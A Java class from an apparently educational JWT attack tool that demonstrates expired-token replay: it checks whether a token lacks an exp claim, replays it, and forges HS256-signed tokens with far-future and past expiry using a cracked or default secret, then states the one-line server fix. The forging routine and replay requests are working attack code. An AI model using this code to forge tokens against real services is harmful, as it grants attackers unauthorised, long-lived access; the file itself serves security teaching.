package rs.raf.bvs.jwttool.attacks;

import org.json.JSONObject;
import rs.raf.bvs.jwttool.http.ApiClient;
import rs.raf.bvs.jwttool.jwt.JwtCodec;
import rs.raf.bvs.jwttool.jwt.JwtParts;

import java.time.Instant;

// Demo in 4 parts. The bug is not in the library but in login() never calling
// withExpiresAt(), so a token with no exp can never expire
//   A - original has no exp, B - still accepted, C - forged exp=2099 passes,
//   D - forged exp in the past rejected (the library defends when exp is present)
public final class A5_ExpiredReplay implements Attack {

    // 1 Jan 2099 00:00 UTC in seconds since epoch, hardcoded
    private static final long YEAR_2099_EPOCH_SECONDS = 4070908800L;

    // one hour in seconds, for exp = one hour ago
    private static final long ONE_HOUR_IN_SECONDS = 3600L;

    @Override
    public AttackResult run(AttackContext ctx) throws Exception {
        AttackResult r = new AttackResult("Attack 5 - Expired Token Replay (no-exp = immortal)");

        if (ctx.getToken() == null) {
            r.fail("No token.");
            return r;
        }

        // if A3 cracked the secret we use it, otherwise fall back to "secret"
        String secret;
        if (ctx.getSecret() != null && !ctx.getSecret().isEmpty()) {
            secret = ctx.getSecret();
        } else {
            secret = "secret";
        }

        JwtParts orig = JwtCodec.split(ctx.getToken());
        String path;
        if (ctx.getTestEndpoint() != null) {
            path = ctx.getTestEndpoint();
        } else {
            path = "/users";
        }

        r.section("Part A - Inspect the original token");
        if (orig.payload.has("exp")) {
            long exp = orig.payload.getLong("exp");
            r.info("Original exp = " + exp + " (" + Instant.ofEpochSecond(exp) + ")");
        } else {
            r.warn("The original token has NO exp claim. It was issued with no expiry time.");
            r.warn("Consequence: this token will work forever. If stolen, lifetime access.");
        }

        r.section("Part B - Original token still valid");
        ApiClient.HttpResult resOrig = ctx.api().get(path, ctx.getToken());
        r.info("GET " + path + " with the original token -> HTTP " + resOrig.status);
        if (resOrig.status == 200) {
            r.warn("Original token accepted (it will never be rejected because it has no exp).");
        }

        r.section("Part C - Forged token with exp = 2099");
        // new token with the same role but exp far in the future
        // since we have the secret, the signature is valid
        String tokenFar = forge(orig, secret, YEAR_2099_EPOCH_SECONDS);
        r.code("Forged token (exp=2099)", tokenFar);
        ApiClient.HttpResult resFar = ctx.api().get(path, tokenFar);
        r.info("GET " + path + " -> HTTP " + resFar.status);
        if (resFar.status == 200) {
            r.warn("Server accepts a token expiring in 2099 - the attacker controls exp himself.");
        } else {
            r.fail("Server rejected the future-exp token (status " + resFar.status + ")");
        }

        r.section("Part D - Forged token with exp = 1h ago");
        // defense-in-depth: if exp falls in the past the library must reject it
        long oneHourAgo = (System.currentTimeMillis() / 1000L) - ONE_HOUR_IN_SECONDS;
        String tokenPast = forge(orig, secret, oneHourAgo);
        r.code("Forged token (exp=past)", tokenPast);
        ApiClient.HttpResult resPast = ctx.api().get(path, tokenPast);
        r.info("GET " + path + " -> HTTP " + resPast.status);
        if (resPast.status == 401) {
            r.ok("Library rejects a token with exp in the past - defense-in-depth works IF exp is present.");
        } else {
            r.warn("Server accepts the expired token - the library fails (status " + resPast.status + ").");
        }

        r.setConclusion("Vulnerability: UserService.login() never sets exp, so tokens are immortal. Fix (1 line): .withExpiresAt(Date.from(Instant.now().plus(1, ChronoUnit.HOURS))).");
        r.setSuccess(true);
        return r;
    }

    // builds a new token with the given exp and signs it with the known secret
    // classic forge: copy payload, change field, re-encode, re-sign
    private static String forge(JwtParts orig, String secret, long expEpoch) {
        JSONObject payload = new JSONObject(orig.payload.toString());
        payload.put("exp", expEpoch);
        payload.put("iat", System.currentTimeMillis() / 1000L);
        String headerB64  = JwtCodec.b64UrlEncode(orig.header.toString());
        String payloadB64 = JwtCodec.b64UrlEncode(payload.toString());
        String signature  = JwtCodec.signHS256(headerB64, payloadB64, secret);
        return JwtCodec.assemble(headerB64, payloadB64, signature);
    }
}
